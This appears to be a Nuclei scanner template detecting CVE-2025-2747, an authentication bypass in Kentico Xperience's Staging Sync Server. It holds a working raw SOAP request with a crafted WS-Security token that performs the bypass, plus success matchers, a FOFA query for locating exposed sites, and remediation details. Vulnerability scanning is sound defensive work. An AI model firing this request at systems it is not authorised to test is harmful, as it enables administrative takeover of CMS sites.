templates/CVE-2025-2747.yaml

http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '{{rand}}'
    - <wsa:Action>
  - condition: or
    negative: true
    part: body
    type: word
    words:
    - Site not running
    - SyncServer.ErrorLicense
    - SyncServer.ErrorServiceNotEnabled
    - Staging service is not enabled on this server
    - Staging does not work with blank password
    - Missing X509 certificate token
    - The security token could not be authenticated or authorized
  - part: content_type
    type: word
    words:
    - text/xml
  matchers-condition: and
  raw:
  - "POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ text/xml; charset=utf-8\nSOAPAction: \"http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData\"\
    \n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n    <soap:Envelope xmlns:xsi=\"\
    http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\
    \ xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n        <soap:Header>\n\
    \            <wsse:Security xmlns:wsse=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd\"\
    \ xmlns:wsu=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\"\
    >\n        <wsse:UsernameToken>\n            <wsse:Username>y3t4kallxq</wsse:Username>\n\
    \            <wsse:Password Type=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest\"\
    >6dfzCOJsdj5Aw+1rGzwoHadPFTQ=</wsse:Password>\n            <wsse:Nonce>4JX/SboVYnxbh8hm3ySQdIUJtFK9cqUh</wsse:Nonce>\n\
    \            <wsu:Created>2025-03-10T20:11:07Z</wsu:Created>\n               \
    \ </wsse:UsernameToken>\n            </wsse:Security>\n        </soap:Header>\n\
    \        <soap:Body>\n            <ProcessSynchronizationTaskData xmlns=\"http://localhost/SyncWebService/SyncServer\"\
    >\n                <stagingTaskData><![CDATA[<{{rand}}>]]></stagingTaskData>\n\
    \            </ProcessSynchronizationTaskData>\n        </soap:Body>\n    </soap:Envelope>\n"
id: CVE-2025-2747
info:
  author: DhiyaneshDK
  classification:
    cve-id: CVE-2025-2747
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
    epss-percentile: 0.99499
    epss-score: 0.88933
  description: 'An authentication bypass vulnerability in Kentico Xperience allows
    authentication bypass via the Staging Sync Server component password handling
    for the server defined None type. Authentication bypass allows an attacker to
    control administrative objects.This issue affects Xperience through 13.0.178.

    '
  impact: 'Unauthenticated attackers can bypass authentication through the Staging
    Sync Server component by exploiting None-type password handling, gaining control
    of administrative objects and potentially compromising the entire Kentico CMS.

    '
  metadata:
    fofa-query: app="Kentico-CMS"
    max-request: 1
    verified: true
  name: Kentico Xperience 13 CMS - Staging Service Authentication Bypass (WT-2025-0006)
  reference:
  - https://github.com/watchtowrlabs/kentico-xperience13-AuthBypass-wt-2025-0006
  - https://devnet.kentico.com/download/hotfixes
  - https://github.com/watchtowrlabs/kentico-xperience13-AuthBypass-wt-2025-0011
  - https://labs.watchtowr.com/bypassing-authentication-like-its-the-90s-pre-auth-rce-chain-s-in-kentico-xperience-cms/
  remediation: 'Upgrade to Kentico Xperience version 13.0.179 or later that properly
    handles Staging Sync Server authentication.

    '
  severity: critical
  tags: cve,cve2025,kentico,stag,auth-bypass,xperience13,kev,vkev,vuln
variables:
  rand: '{{to_lower(rand_text_alpha(5))}}'
